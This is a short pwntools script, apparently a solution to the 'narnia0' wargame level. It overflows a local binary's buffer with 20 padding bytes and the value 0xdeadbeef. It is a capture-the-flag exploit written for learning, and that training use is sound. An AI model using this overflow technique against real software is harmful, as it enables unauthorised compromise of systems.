from pwn import *

target = process("./narnia0")
print(target.recv())
target.send('A'*20 + "\xef\xbe\xad\xde\n")
print(target.recv())
